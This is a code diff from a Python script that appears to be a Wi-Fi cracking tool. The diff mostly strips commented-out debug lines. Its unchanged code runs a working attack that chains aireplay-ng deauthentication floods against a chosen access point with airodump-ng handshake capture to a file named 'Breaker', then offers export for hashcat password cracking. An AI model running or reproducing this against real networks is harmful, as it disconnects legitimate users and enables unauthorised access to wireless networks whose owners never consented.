@@ -29,10 +29,6 @@ while True:
         print("Please select your WIFI device of choise")
         os.system("ifconfig | awk -F':' {'print $1'} |cut -d' ' -f1 |awk /./")
         NETWORK_CARD = str(input("DEVICE : "))
-        #NETWORK_CARD = os.system("sudo airmon-ng start "+ NETWORK_CARD +" | cut -d ']' -f3 | cut -d ')' -f1 | awk /./ >> /tmp/Network_Card.txt")
-        #with open('/tmp/Network_Card.txt') as F:
-        #    lines = F.readlines()
-        #    NETWORK_CARD = lines[CARD]
 
     def Network():
         global ADDRESS
@@ -50,27 +46,15 @@ while True:
             for num, line in enumerate(User_Readable,1):
                 if User_SSID in line:
                     LINE = str(num)
-                    #print(LINE)
                     LINE = int(LINE) - 1
-                    #print(LINE)
-                # file = open('/tmp/value.txt','w')
-                    #file.write(num)
-                    #print("foind line : ", num)
-
-        #with open('/tmp/value.txt') as Variable:
-        #lines = Variable.readline()
-            #LINE = lines[1]
-            # print(LINE)
 
         with open('/tmp/Address.txt') as User_Address:
             lines = User_Address.read().splitlines()
             ADDRESS = lines[int(LINE)]
-            #print(ADDRESS)
 
         with open('/tmp/Channel.txt') as User_Channel:
             lines = User_Channel.read().splitlines()
             CHANNEL = lines[int(LINE)]
-        #print(Channel)
 
     def Monitor_Mode():
         global CARD
@@ -93,7 +77,6 @@ while True:
         global CHANNEL
         global NETWORK_CARD
         print("do a thing.... please")
-        #os.system("sudo aireplay-ng -0 100 -a "+ ADDRESS +" -i "+ NETWORK_CARD)
         os.system("sudo aireplay-ng -0 100 -a "+ ADDRESS +"  "+ NETWORK_CARD +" & sudo airodump-ng --bssid "+ ADDRESS+" --channel "+ CHANNEL +" --output-format cap --write ~/Desktop/Breaker " + NETWORK_CARD)
         print("")
         B = input("Do you want to export the file so it can work in hashcat? (Y/N)")
